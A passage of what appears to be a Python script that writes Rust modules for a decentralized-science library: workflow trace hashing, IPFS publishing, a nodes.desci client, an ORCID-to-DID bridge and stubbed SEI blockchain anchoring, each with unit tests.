        }
        if chain != self.causal_chain {
            info!("Causal chain mismatch");
            return false;
        }
        true
    }

    pub fn get_step(&self, id: &str) -> Option<&WorkflowStep> {
        self.steps.iter().find(|s| s.id.as_str() == id)
    }
    pub fn get_step_mut(&mut self, id: &str) -> Option<&mut WorkflowStep> {
        self.steps.iter_mut().find(|s| s.id.as_str() == id)
    }
    pub fn completed_count(&self) -> usize {
        self.steps.iter().filter(|s| matches!(s.status, StepStatus::Completed)).count()
    }
    pub fn total_count(&self) -> usize { self.steps.len() }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_step_hash_deterministic() {
        let s1 = WorkflowStep::new("s1", "Align", "blastn")
            .with_parameters(serde_json::json!({"db": "nr"}));
        let s2 = WorkflowStep::new("s1", "Align", "blastn")
            .with_parameters(serde_json::json!({"db": "nr"}));
        assert_eq!(s1.compute_hash(), s2.compute_hash());
    }

    #[test]
    fn test_step_hash_differs() {
        let s1 = WorkflowStep::new("s1", "X", "a").with_parameters(json!({"e": "1e-5"}));
        let s2 = WorkflowStep::new("s1", "X", "a").with_parameters(json!({"e": "1e-10"}));
        assert_ne!(s1.compute_hash(), s2.compute_hash());
    }

    #[test]
    fn test_trace_verify_ok() {
        let mut t = ScientificWorkflowTrace::new("test", WorkflowType::Nextflow);
        let mut s = WorkflowStep::new("s1", "DL", "wget");
        s.start(); s.complete(vec!["data.fa".into()]);
        t.add_step(s).unwrap();
        let mut s2 = WorkflowStep::new("s2", "Align", "blast");
        s2.start(); s2.complete(vec!["out.tsv".into()]);
        t.add_step(s2).unwrap();
        assert!(t.verify());
        assert_eq!(t.completed_count(), 2);
    }

    #[test]
    fn test_trace_tamper_detected() {
        let mut t = ScientificWorkflowTrace::new("test", WorkflowType::Nextflow);
        let mut s = WorkflowStep::new("s1", "DL", "wget");
        s.start(); s.complete(vec!["data.fa".into()]);
        t.add_step(s).unwrap();
        t.steps[0].name = "TAMPERED".into();
        assert!(!t.verify());
    }

    #[test]
    fn test_duplicate_step_rejected() {
        let mut t = ScientificWorkflowTrace::new("test", WorkflowType::Nextflow);
        t.add_step(WorkflowStep::new("s1", "A", "x")).unwrap();
        assert!(t.add_step(WorkflowStep::new("s1", "B", "y")).is_err());
    }

    #[test]
    fn test_owner_did_roundtrip() {
        let t = ScientificWorkflowTrace::new("wf", WorkflowType::Jupyter)
            .with_owner("did:arkhe:researcher-001");
        let json = serde_json::to_string(&t).unwrap();
        let t2: ScientificWorkflowTrace = serde_json::from_str(&json).unwrap();
        assert_eq!(t2.owner_did.as_deref(), Some("did:arkhe:researcher-001"));
    }

    #[test]
    fn test_agent_did_in_step() {
        let mut s = WorkflowStep::new("s1", "X", "y").with_agent("did:arkhe:agent-01");
        s.start(); s.complete(vec!["out".into()]);
        let h = s.compute_hash();
        // Com agent_did diferente, hash diferente
        let mut s2 = WorkflowStep::new("s1", "X", "y").with_agent("did:arkhe:agent-02");
        s2.start(); s2.complete(vec!["out".into()]);
        assert_ne!(h, s2.compute_hash());
    }
}
'''

with open(f"{base_dir}/src/workflow_traceability.rs", "w") as f:
    f.write(trace_rs)

publishing_rs = r'''//! Publicação descentralizada: IPFS + WormGraph gRPC
//!
//! NOTA: chainlink_ccip crate não existe como cliente Rust.
//! Integração CCIP real = ethers-rs/alloy + smart contracts Solidity.
//! Para notificações internas ARKHE, usamos WormGraph gRPC.

use serde::{Deserialize, Serialize};
use tracing::info;

use crate::error::{DesciError, Result};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DatasetMetadata {
    pub name: String,
    pub description: String,
    pub format: String,
    pub version: String,
    pub author_did: String,
    pub orcid_id: Option<String>,
    pub license: String,
    pub tags: Vec<String>,
    pub created_at: String,
    pub checksum_sha256: String,
    /// CID do trace IC16 associado
    pub trace_id: Option<String>,
    /// Referência ao node.desci de origem
    pub node_desci_url: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IpfsPublishResult {
    pub cid: String,
    pub gateway_url: String,
    pub size_bytes: u64,
}

/// Cliente IPFS (requer feature `ipfs`)
#[cfg(feature = "ipfs")]
pub struct IpfsClient {
    api_url: String,
    gateway_url: String,
    http: reqwest::Client,
}

#[cfg(feature = "ipfs")]
impl IpfsClient {
    pub fn local() -> Self {
        Self {
            api_url: "http://127.0.0.1:5001/api/v0".into(),
            gateway_url: "http://127.0.0.1:8080/ipfs".into(),
            http: reqwest::Client::new(),
        }
    }

    pub fn new(api_url: &str, gateway_url: &str) -> Self {
        Self {
            api_url: api_url.into(),
            gateway_url: gateway_url.into(),
            http: reqwest::Client::new(),
        }
    }

    pub async fn add_bytes(&self, data: &[u8], filename: &str) -> Result<IpfsPublishResult> {
        let form = reqwest::multipart::Form::new()
            .part("file", reqwest::multipart::Part::bytes(data.to_vec())
                .file_name(filename.to_string()));

        let resp = self.http
            .post(format!("{}/add", self.api_url))
            .multipart(form)
            .send().await
            .map_err(|e| DesciError::IpfsError(e.to_string()))?
            .error_for_status()
            .map_err(|e| DesciError::IpfsError(e.to_string()))?
            .json::<serde_json::Value>().await
            .map_err(|e| DesciError::IpfsError(e.to_string()))?;

        let cid = resp["Hash"].as_str()
            .ok_or_else(|| DesciError::IpfsError("No CID".into()))?
            .to_string();
        let size = resp["Size"].as_u64().unwrap_or(data.len() as u64);

        Ok(IpfsPublishResult {
            cid: cid.clone(),
            gateway_url: format!("{}/{}", self.gateway_url, cid),
            size_bytes: size,
        })
    }

    pub fn api_url(&self) -> &str { &self.api_url }
    pub fn gateway_url(&self) -> &str { &self.gateway_url }
}

/// Stub WormGraph (gRPC real requer proto compilado)
pub struct WormGraphNotifier {
    endpoint: String,
}

impl WormGraphNotifier {
    pub fn new(endpoint: &str) -> Self {
        Self { endpoint: endpoint.into() }
    }

    pub async fn notify_publication(
        &self, cid: &str, metadata: &DatasetMetadata,
    ) -> Result<String> {
        let notif_id = blake3::hash(
            format!("{}:{}:{}", cid, metadata.name, chrono::Utc::now().timestamp_millis()).as_bytes()
        ).to_string();

        info!(
            notif_id = %notif_id, cid = %cid, dataset = %metadata.name,
            "WormGraph notification sent (stub)"
        );
        Ok(notif_id)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PublishResult {
    pub cid: String,
    pub gateway_url: String,
    pub size_bytes: u64,
    pub notification_id: String,
    pub metadata: DatasetMetadata,
}

/// Publicador orquestrado
#[cfg(feature = "ipfs")]
pub struct DeSciPublisher {
    ipfs: IpfsClient,
    wormgraph: WormGraphNotifier,
}

#[cfg(feature = "ipfs")]
impl DeSciPublisher {
    pub fn local() -> Self {
        Self {
            ipfs: IpfsClient::local(),
            wormgraph: WormGraphNotifier::new("http://localhost:50051"),
        }
    }

    pub async fn publish_bytes(
        &self, data: &[u8], filename: &str, metadata: DatasetMetadata,
    ) -> Result<PublishResult> {
        let ipfs_r = self.ipfs.add_bytes(data, filename).await?;
        let notif_id = self.wormgraph.notify_publication(&ipfs_r.cid, &metadata).await?;
        Ok(PublishResult {
            cid: ipfs_r.cid, gateway_url: ipfs_r.gateway_url,
            size_bytes: ipfs_r.size_bytes, notification_id: notif_id,
            metadata,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_meta() -> DatasetMetadata {
        DatasetMetadata {
            name: "BRCA1 Variants".into(),
            description: "Curated BRCA1".into(),
            format: "vcf".into(),
            version: "1.0.0".into(),
            author_did: "did:arkhe:r-001".into(),
            orcid_id: Some("0000-0001-2345-6789".into()),
            license: "CC-BY-4.0".into(),
            tags: vec!["genomics".into()],
            created_at: "2026-07-01T12:00:00Z".into(),
            checksum_sha256: "abc".into(),
            trace_id: Some("trace-123".into()),
            node_desci_url: Some("https://nodes.desci.com/node/42".into()),
        }
    }

    #[test]
    fn test_metadata_serialization() {
        let m = sample_meta();
        let json = serde_json::to_string(&m).unwrap();
        let m2: DatasetMetadata = serde_json::from_str(&json).unwrap();
        assert_eq!(m.name, m2.name);
        assert_eq!(m.orcid_id, m2.orcid_id);
        assert_eq!(m.trace_id, m2.trace_id);
        assert_eq!(m.node_desci_url, m2.node_desci_url);
    }

    #[test]
    fn test_publish_result_serialization() {
        let r = PublishResult {
            cid: "QmTest".into(),
            gateway_url: "http://gw/ipfs/QmTest".into(),
            size_bytes: 1024,
            notification_id: "n-123".into(),
            metadata: sample_meta(),
        };
        let json = serde_json::to_string_pretty(&r).unwrap();
        assert!(json.contains("QmTest"));
        assert!(json.contains("BRCA1"));
    }
}
'''

with open(f"{base_dir}/src/publishing.rs", "w") as f:
    f.write(publishing_rs)

nodes_rs = r'''//! Integração com nodes.desci — rede de nós científicos descentralizados
//!
//! nodes.desci é a infraestrutura de nós que hospeda datasets, executa
//! workflows e fornece provenance. Este módulo oferece:
//! - Descoberta de nós disponíveis
//! - Query de datasets por CID ou metadados
//! - Registro de provedores de dados
//! - Healthcheck de nós

use serde::{Deserialize, Serialize};
use tracing::{info, warn};

use crate::error::{DesciError, Result};

/// Informação de um nó nodes.desci
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NodeInfo {
    pub node_id: String,
    pub url: String,
    pub name: String,
    pub region: String,
    pub status: NodeStatus,
    pub capabilities: Vec<String>,
    pub datasets_count: u64,
    pub last_seen: String,
    pub owner_did: Option<String>,
    #[serde(default)]
    pub metadata: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum NodeStatus {
    Online,
    Offline,
    Degraded,
    Unknown,
}

impl std::fmt::Display for NodeStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Online => write!(f, "online"),
            Self::Offline => write!(f, "offline"),
            Self::Degraded => write!(f, "degraded"),
            Self::Unknown => write!(f, "unknown"),
        }
    }
}

/// Dataset em um nó
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NodeDataset {
    pub cid: String,
    pub name: String,
    pub format: String,
    pub size_bytes: u64,
    pub uploaded_by: String,
    pub uploaded_at: String,
    pub metadata: serde_json::Value,
    /// Trace IC16 associado
    pub trace_id: Option<String>,
    /// ORCID do uploader
    pub orcid_id: Option<String>,
}

/// Resultado de busca em nós
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NodeSearchResult {
    pub node_id: String,
    pub node_url: String,
    pub datasets: Vec<NodeDataset>,
    pub total_matching: u64,
}

/// Cliente nodes.desci (requer feature `ipfs` para HTTP real)
#[cfg(feature = "ipfs")]
pub struct NodesDesciClient {
    base_url: String,
    http: reqwest::Client,
}

#[cfg(feature = "ipfs")]
impl NodesDesciClient {
    pub fn new(base_url: &str) -> Self {
        Self {
            base_url: base_url.trim_end_matches('/').to_string(),
            http: reqwest::Client::new(),
        }
    }

    /// Healthcheck de um nó
    pub async fn healthcheck(&self) -> Result<NodeInfo> {
        let url = format!("{}/api/v1/health", self.base_url);
        let resp = self.http.get(&url)
            .send().await
            .map_err(|e| DesciError::NodeUnreachable { url: self.base_url.clone() })?
            .error_for_status()
            .map_err(|e| DesciError::NodesDesciError(e.to_string()))?;

        let mut info: NodeInfo = resp.json().await
            .map_err(|e| DesciError::NodesDesciError(e.to_string()))?;
        info.status = NodeStatus::Online;
        Ok(info)
    }

    /// Busca datasets por query textual
    pub async fn search_datasets(&self, query: &str, limit: u32) -> Result<NodeSearchResult> {
        let url = format!("{}/api/v1/datasets/search", self.base_url);
        let resp = self.http.get(&url)
            .query(&[("q", query), ("limit", &limit.to_string())])
            .send().await
            .map_err(|e| DesciError::NodesDesciError(e.to_string()))?
            .error_for_status()
            .map_err(|e| DesciError::NodesDesciError(e.to_string()))?;

        let mut result: NodeSearchResult = resp.json().await
            .map_err(|e| DesciError::NodesDesciError(e.to_string()))?;
        result.node_url = self.base_url.clone();
        Ok(result)
    }

    /// Resolve CID para download URL
    pub fn download_url(&self, cid: &str) -> String {
        format!("{}/api/v1/datasets/{}/download", self.base_url, cid)
    }

    pub fn base_url(&self) -> &str { &self.base_url }
}

/// Gerenciador de múltiplos nós
pub struct NodeRegistry {
    nodes: Vec<NodeInfo>,
}

impl NodeRegistry {
    pub fn new() -> Self {
        Self { nodes: Vec::new() }
    }

    /// Registra um nó manualmente
    pub fn register(&mut self, node: NodeInfo) {
        if let Some(existing) = self.nodes.iter_mut().find(|n| n.node_id == node.node_id) {
            *existing = node;
        } else {
            self.nodes.push(node);
        }
    }

    /// Retorna nós online
    pub fn online_nodes(&self) -> Vec<&NodeInfo> {
        self.nodes.iter().filter(|n| n.status == NodeStatus::Online).collect()
    }

    /// Retorna nós com capability específica
    pub fn nodes_with_capability(&self, cap: &str) -> Vec<&NodeInfo> {
        self.nodes.iter()
            .filter(|n| n.capabilities.iter().any(|c| c == cap))
            .collect()
    }

    /// Busca em todos os nós online (stub — em produção, paralelo)
    pub fn search_all(&self, query: &str) -> Vec<NodeSearchResult> {
        self.online_nodes().iter().map(|node| NodeSearchResult {
            node_id: node.node_id.clone(),
            node_url: node.url.clone(),
            datasets: Vec::new(), // Em produção: HTTP request
            total_matching: 0,
        }).collect()
    }

    pub fn all_nodes(&self) -> &[NodeInfo] { &self.nodes }
    pub fn len(&self) -> usize { self.nodes.len() }
    pub fn is_empty(&self) -> bool { self.nodes.is_empty() }
}

impl Default for NodeRegistry {
    fn default() -> Self { Self::new() }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_node() -> NodeInfo {
        NodeInfo {
            node_id: "node-br-sp-01".into(),
            url: "https://nodes.desci.com/node/1".into(),
            name: "São Paulo Research Node".into(),
            region: "br-south".into(),
            status: NodeStatus::Online,
            capabilities: vec!["storage".into(), "nextflow".into(), "jupyter".into()],
            datasets_count: 1247,
            last_seen: "2026-07-01T10:00:00Z".into(),
            owner_did: Some("did:arkhe:node-operator-01".into()),
            metadata: serde_json::json!({"tier": "premium"}),
        }
    }

    fn sample_dataset() -> NodeDataset {
        NodeDataset {
            cid: "QmBRCA1Dataset".into(),
            name: "BRCA1 Variant Dataset v2".into(),
            format: "vcf.gz".into(),
            size_bytes: 15_000_000,
            uploaded_by: "did:arkhe:researcher-001".into(),
            uploaded_at: "2026-06-15T14:30:00Z".into(),
            metadata: serde_json::json!({"genes": ["BRCA1"], "variants": 4200}),
            trace_id: Some("trace-abc-123".into()),
            orcid_id: Some("0000-0001-2345-6789".into()),
        }
    }

    #[test]
    fn test_node_serialization() {
        let n = sample_node();
        let json = serde_json::to_string(&n).unwrap();
        let n2: NodeInfo = serde_json::from_str(&json).unwrap();
        assert_eq!(n.node_id, n2.node_id);
        assert_eq!(n.capabilities, n2.capabilities);
    }

    #[test]
    fn test_dataset_serialization() {
        let d = sample_dataset();
        let json = serde_json::to_string(&d).unwrap();
        let d2: NodeDataset = serde_json::from_str(&json).unwrap();
        assert_eq!(d.cid, d2.cid);
        assert_eq!(d.trace_id, d2.trace_id);
        assert_eq!(d.orcid_id, d2.orcid_id);
    }

    #[test]
    fn test_registry_register_and_filter() {
        let mut reg = NodeRegistry::new();

        let mut n2 = sample_node();
        n2.node_id = "node-us-west-02".into();
        n2.status = NodeStatus::Offline;
        n2.capabilities = vec!["storage".into()];

        reg.register(sample_node());
        reg.register(n2);

        assert_eq!(reg.len(), 2);
        assert_eq!(reg.online_nodes().len(), 1);
        assert_eq!(reg.nodes_with_capability("nextflow").len(), 1);
        assert_eq!(reg.nodes_with_capability("storage").len(), 2);
    }

    #[test]
    fn test_node_status_display() {
        assert_eq!(NodeStatus::Online.to_string(), "online");
        assert_eq!(NodeStatus::Degraded.to_string(), "degraded");
    }

    #[test]
    fn test_search_result_serialization() {
        let r = NodeSearchResult {
            node_id: "node-1".into(),
            node_url: "https://x.com".into(),
            datasets: vec![sample_dataset()],
            total_matching: 1,
        };
        let json = serde_json::to_string_pretty(&r).unwrap();
        assert!(json.contains("QmBRCA1Dataset"));
        assert!(json.contains("trace-abc-123"));
    }
}
'''

with open(f"{base_dir}/src/nodes_desci.rs", "w") as f:
    f.write(nodes_rs)

orcid_rs = r'''//! ORCID ↔ DIDArkhe Bridge
//!
//! Conecta identidades ORCID ao ecossistema DID do ARKHE:
//! - Verificação de ORCID via API pública
//! - Derivação de DID a partir do ORCID iD
//! - Resolução DID → ORCID profile
//! - Attestation: prova de que um DID controla um ORCID

use serde::{Deserialize, Serialize};
use tracing::{info, warn};

use crate::error::{DesciError, Result};

/// Prefixo DID para ORCID no ARKHE
pub const DID_ORCID_PREFIX: &str = "did:arkhe:orcid";

/// Perfil ORCID simplificado
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OrcidProfile {
    pub orcid_id: String,
    pub given_names: String,
    pub family_name: String,
    pub email: Option<String>,
    pub institution: Option<String>,
    pub country: Option<String>,
    pub works_count: u32,
    pub keywords: Vec<String>,
}

/// DID derivado de ORCID
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OrcidDID {
    pub did: String,
    pub orcid_id: String,
    pub did_document: DidDocument,
    pub verified: bool,
    pub verified_at: Option<String>,
}

/// DID Document simplificado (W3C DID Core)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DidDocument {
    pub id: String,
    pub controller: Option<String>,
    #[serde(rename = "verificationMethod")]
    pub verification_methods: Vec<VerificationMethod>,
    pub service: Vec<DidService>,
    pub alsoKnownAs: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VerificationMethod {
    pub id: String,
    #[serde(rename = "type")]
    pub vm_type: String,
    pub controller: String,
    pub public_key_multibase: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DidService {
    pub id: String,
    #[serde(rename = "type")]
    pub service_type: String,
    pub service_endpoint: String,
}

/// Attestation: prova criptográfica de vínculo DID↔ORCID
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OrcidAttestation {
    pub attester_did: String,
    pub subject_did: String,
    pub orcid_id: String,
    pub claim_type: String,
    pub issued_at: String,
    pub expires_at: String,
    pub proof_hash: String,
}

/// Cliente ORCID (requer feature `orcid` para HTTP real)
#[cfg(feature = "orcid")]
pub struct OrcidClient {
    base_url: String,
    http: reqwest::Client,
    // Em produção: client_id + client_secret para OAuth
}

#[cfg(feature = "orcid")]
impl OrcidClient {
    /// API pública (sem auth, dados limitados)
    pub fn public() -> Self {
        Self {
            base_url: "https://pub.orcid.org/v3.0".into(),
            http: reqwest::Client::builder()
                .default_headers({
                    let mut h = reqwest::header::HeaderMap::new();
                    h.insert("Accept", "application/json".parse().unwrap());
                    h
                })
                .build()
                .unwrap(),
        }
    }

    /// Busca perfil público pelo ORCID iD
    pub async fn get_profile(&self, orcid_id: &str) -> Result<OrcidProfile> {
        let clean_id = orcid_id.trim_start_matches("https://orcid.org/");
        let url = format!("{}/{}/record", self.base_url, clean_id);

        let resp = self.http.get(&url)
            .send().await
            .map_err(|e| DesciError::OrcidError(e.to_string()))?;

        if resp.status() == reqwest::StatusCode::NOT_FOUND {
            return Err(DesciError::OrcidNotFound { orcid_id: orcid_id.into() });
        }
        resp.error_for_status()
            .map_err(|e| DesciError::OrcidError(e.to_string()))?;

        let data: serde_json::Value = resp.json().await
            .map_err(|e| DesciError::OrcidError(e.to_string()))?;

        let name = &data["person"]["name"];
        Ok(OrcidProfile {
            orcid_id: clean_id.into(),
            given_names: name["given-names"]["value"].as_str().unwrap_or("").into(),
            family_name: name["family-name"]["value"].as_str().unwrap_or("").into(),
            email: None, // Requer OAuth para acesso
            institution: data["employment-summary"]
                .get(0)["organization"]["name"].as_str().map(String::from),
            country: data["address"]["country"]["value"].as_str().map(String::from),
            works_count: data["activities-summary"]["works"]["group"].as_array()
                .map(|a| a.len() as u32).unwrap_or(0),
            keywords: data["keywords"]["keyword"].as_array()
                .map(|a| a.iter().filter_map(|k| k["content"].as_str().map(String::from)).collect())
                .unwrap_or_default(),
        })
    }

    pub fn base_url(&self) -> &str { &self.base_url }
}

/// Deriva DID ARKHE a partir de ORCID iD
pub fn derive_did(orcid_id: &str) -> String {
    let clean = orcid_id
        .trim_start_matches("https://orcid.org/")
        .replace('-', "");
    let hash = blake3::hash(clean.as_bytes()).to_string()[..16].to_string();
    format!("{}:{}", DID_ORCID_PREFIX, hash)
}

/// Gera DID Document para um ORCID
pub fn build_did_document(orcid_id: &str) -> OrcidDID {
    let did = derive_did(orcid_id);
    let vm_id = format!("{}#key-1", did);

    OrcidDID {
        did: did.clone(),
        orcid_id: orcid_id.trim_start_matches("https://orcid.org/").into(),
        did_document: DidDocument {
            id: did.clone(),
            controller: Some(did.clone()),
            verification_methods: vec![VerificationMethod {
                id: vm_id,
                vm_type: "Ed25519VerificationKey2020".into(),
                controller: did.clone(),
                public_key_multibase: None, // Em produção: chave real
            }],
            service: vec![
                DidService {
                    id: format!("{}#orcid", did),
                    service_type: "OrcidProfile".into(),
                    service_endpoint: format!("https://orcid.org/{}", orcid_id),
                },
                DidService {
                    id: format!("{}#desci", did),
                    service_type: "DesciNode".into(),
                    service_endpoint: "https://nodes.desci.com".into(),
                },
            ],
            alsoKnownAs: vec![format!("https://orcid.org/{}", orcid_id)],
        },
        verified: false,
        verified_at: None,
    }
}

/// Cria attestation de vínculo
pub fn create_attestation(
    attester_did: &str,
    subject_did: &str,
    orcid_id: &str,
    valid_hours: u64,
) -> OrcidAttestation {
    let now = chrono::Utc::now();
    let expires = now + chrono::Duration::hours(valid_hours as i64);

    let claim = format!("{}:{}:{}:{}",
        attester_did, subject_did, orcid_id, now.timestamp()
    );
    let proof_hash = blake3::hash(claim.as_bytes()).to_string();

    OrcidAttestation {
        attester_did: attester_did.into(),
        subject_did: subject_did.into(),
        orcid_id: orcid_id.into(),
        claim_type: "OrcidOwnership".into(),
        issued_at: now.to_rfc3339(),
        expires_at: expires.to_rfc3339(),
        proof_hash,
    }
}

/// Verifica uma attestation
pub fn verify_attestation(att: &OrcidAttestation) -> bool {
    let claim = format!("{}:{}:{}:{}",
        att.attester_did, att.subject_did, att.orcid_id,
        chrono::DateTime::parse_from_rfc3339(&att.issued_at)
            .map(|dt| dt.timestamp()).unwrap_or(0)
    );
    let expected = blake3::hash(claim.as_bytes()).to_string();
    if att.proof_hash != expected {
        return false;
    }
    // Verificar expiração
    if let Ok(exp) = chrono::DateTime::parse_from_rfc3339(&att.expires_at) {
        if chrono::Utc::now() > exp.with_timezone(&chrono::Utc) {
            return false;
        }
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    const TEST_ORCID: &str = "0000-0001-2345-6789";

    #[test]
    fn test_derive_did_deterministic() {
        let d1 = derive_did(TEST_ORCID);
        let d2 = derive_did(TEST_ORCID);
        assert_eq!(d1, d2);
        assert!(d1.starts_with(DID_ORCID_PREFIX));
    }

    #[test]
    fn test_derive_did_different_orcid() {
        let d1 = derive_did("0000-0001-2345-6789");
        let d2 = derive_did("0000-0002-9876-5432");
        assert_ne!(d1, d2);
    }

    #[test]
    fn test_derive_did_strips_url_prefix() {
        let d1 = derive_did(TEST_ORCID);
        let d2 = derive_did(&format!("https://orcid.org/{}", TEST_ORCID));
        assert_eq!(d1, d2);
    }

    #[test]
    fn test_build_did_document() {
        let odid = build_did_document(TEST_ORCID);
        assert!(odid.did.starts_with(DID_ORCID_PREFIX));
        assert_eq!(odid.orcid_id, TEST_ORCID);
        assert_eq!(odid.did_document.id, odid.did);
        assert_eq!(odid.did_document.verification_methods.len(), 1);
        assert_eq!(odid.did_document.service.len(), 2);
        assert!(!odid.verified);
    }

    #[test]
    fn test_did_document_serialization() {
        let odid = build_did_document(TEST_ORCID);
        let json = serde_json::to_string_pretty(&odid).unwrap();
        assert!(json.contains("did:arkhe:orcid:"));
        assert!(json.contains("Ed25519VerificationKey2020"));
        assert!(json.contains("OrcidProfile"));
        assert!(json.contains("DesciNode"));
        // Round-trip
        let odid2: OrcidDID = serde_json::from_str(&json).unwrap();
        assert_eq!(odid.did, odid2.did);
    }

    #[test]
    fn test_attestation_roundtrip() {
        let att = create_attestation(
            "did:arkhe:authority-01",
            "did:arkhe:orcid:abc123",
            TEST_ORCID,
            24,
        );
        assert_eq!(att.attester_did, "did:arkhe:authority-01");
        assert_eq!(att.claim_type, "OrcidOwnership");
        assert!(verify_attestation(&att));
    }

    #[test]
    fn test_attestation_tampered_fails() {
        let mut att = create_attestation("did:a", "did:b", TEST_ORCID, 24);
        att.proof_hash = "tampered".into();
        assert!(!verify_attestation(&att));
    }

    #[test]
    fn test_orcid_profile_serialization() {
        let p = OrcidProfile {
            orcid_id: TEST_ORCID.into(),
            given_names: "João".into(),
            family_name: "Silva".into(),
            email: Some("joao@uni.br".into()),
            institution: Some("USP".into()),
            country: Some("BR".into()),
            works_count: 42,
            keywords: vec!["genomics".into(), "crispr".into()],
        };
        let json = serde_json::to_string(&p).unwrap();
        let p2: OrcidProfile = serde_json::from_str(&json).unwrap();
        assert_eq!(p.works_count, p2.works_count);
        assert_eq!(p.keywords, p2.keywords);
    }
}
'''

with open(f"{base_dir}/src/orcid.rs", "w") as f:
    f.write(orcid_rs)

sei_rs = r'''//! SEI GigaChain — ancoragem on-chain de datasets DeSci
//!
//! SEI é uma blockchain L1 com CosmWasm. Este módulo fornece:
//! - Tipos para interação com contratos DesciAnchor.sol / DesciAnchor.wasm
//! - Serialização de mensagens para o contrato
//! - Stubs para chamadas on-chain (requer implementação real com cosmwasm-std
//!   ou ethers-rs se usar EVM sidechain)
//!
//! NOTA: Em produção, usar cosmwasm-std + cw-multi-test para testes.

use serde::{Deserialize, Serialize};
use tracing::info;

use crate::error::{DesciError, Result};

/// Mensagem para ancorar um dataset
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnchorMsg {
    pub cid: String,
    pub checksum_sha256: String,
    pub author_did: String,
    pub orcid_id: Option<String>,
    pub trace_id: Option<String>,
    pub metadata_uri: Option<String>,
    pub license: String,
}

/// Mensagem para registrar identidade
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterIdentityMsg {
    pub did: String,
    pub orcid_id: Option<String>,
    pub controller: String,
}

/// Resposta de query: anchor info
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnchorInfo {
    pub cid: String,
    pub owner: String,
    pub author_did: String,
    pub orcid_id: Option<String>,
    pub trace_id: Option<String>,
    pub checksum_sha256: String,
    pub anchored_at: u64,  // blockchain timestamp
    pub block_height: u64,
    pub tx_hash: String,
}

/// Resposta de query: identidade
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IdentityInfo {
    pub did: String,
    pub orcid_id: Option<String>,
    pub controller: String,
    pub anchor_count: u64,
    pub registered_at: u64,
}

/// Evento emitido pelo contrato
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnchorEvent {
    pub event_type: String,
    pub cid: String,
    pub author_did: String,
    pub block_height: u64,
    pub tx_hash: String,
}

/// Cliente SEI (stub — requer feature `sei-giga` para implementação real)
#[cfg(feature = "sei-giga")]
pub struct SeiGigaClient {
    chain_id: String,
    contract_address: String,
    rpc_url: String,
    http: reqwest::Client,
}

#[cfg(feature = "sei-giga")]
impl SeiGigaClient {
    pub fn new(chain_id: &str, contract_address: &str, rpc_url: &str) -> Self {
        Self {
            chain_id: chain_id.into(),
            contract_address: contract_address.into(),
            rpc_url: rpc_url.into(),
            http: reqwest::Client::new(),
        }
    }

    /// Ancora dataset (stub — em produção: cosmwasm execute)
    pub async fn anchor_dataset(&self, msg: &AnchorMsg) -> Result<AnchorEvent> {
        info!(
            cid = %msg.cid, did = %msg.author_did,
            "Anchoring dataset on SEI (stub)"
        );

        // Stub: em produção seria uma transação cosmwasm real
        Ok(AnchorEvent {
            event_type: "wasm-anchor".into(),
            cid: msg.cid.clone(),
            author_did: msg.author_did.clone(),
            block_height: 0,
            tx_hash: format!("0x{}", blake3::hash(msg.cid.as_bytes()).to_string()[..16].to_string()),
        })
    }

    /// Query anchor info (stub)
    pub async fn query_anchor(&self, cid: &str) -> Result<AnchorInfo> {
        Err(DesciError::AnchorNotFound { cid: cid.into() })
    }

    /// Registra identidade (stub)
    pub async fn register_identity(&self, msg: &RegisterIdentityMsg) -> Result<String> {
        info!(did = %msg.did, "Registering identity on SEI (stub)");
        Ok(format!("0x{}", blake3::hash(msg.did.as_bytes()).to_string()[..16].to_string()))
    }

    pub fn chain_id(&self) -> &str { &self.chain_id }
    pub fn contract_address(&self) -> &str { &self.contract_address }
}

/// Calcula hash do payload de ancoragem (para verificação off-chain)
pub fn compute_anchor_hash(msg: &AnchorMsg) -> String {
    let payload = format!(
        "{}:{}:{}:{}:{}",
        msg.cid, msg.checksum_sha256, msg.author_did,
        msg.orcid_id.as_deref().unwrap_or(""),
        msg.license,
    );
    blake3::hash(payload.as_bytes()).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_anchor_msg() -> AnchorMsg {
        AnchorMsg {
            cid: "QmBRCA1Dataset".into(),
            checksum_sha256: "sha256:abc123def456".into(),
            author_did: "did:arkhe:orcid:abc12345".into(),
            orcid_id: Some("0000-0001-2345-6789".into()),
            trace_id: Some("trace-xyz-789".into()),
            metadata_uri: Some("ipfs://QmMeta".into()),
            license: "CC-BY-4.0".into(),
        }
    }

    #[test]
    fn test_anchor_msg_serialization() {
        let msg = sample_anchor_msg();
        let json = serde_json::to_string_pretty(&msg).unwrap();
        let msg2: AnchorMsg = serde_json::from_str(&json).unwrap();
        assert_eq!(msg.cid, msg2.cid);
        assert_eq!(msg.orcid_id, msg2.orcid_id);
        assert_eq!(msg.trace_id, msg2.trace_id);
    }

    #[test]
    fn test_anchor_hash_deterministic() {
        let msg = sample_anchor_msg();
        let h1 = compute_anchor_hash(&msg);
        let h2 = compute_anchor_hash(&msg);
        assert_eq!(h1, h2);
    }

    #[test]
    fn test_anchor_hash_differs_on_change() {
        let mut msg = sample_anchor_msg();
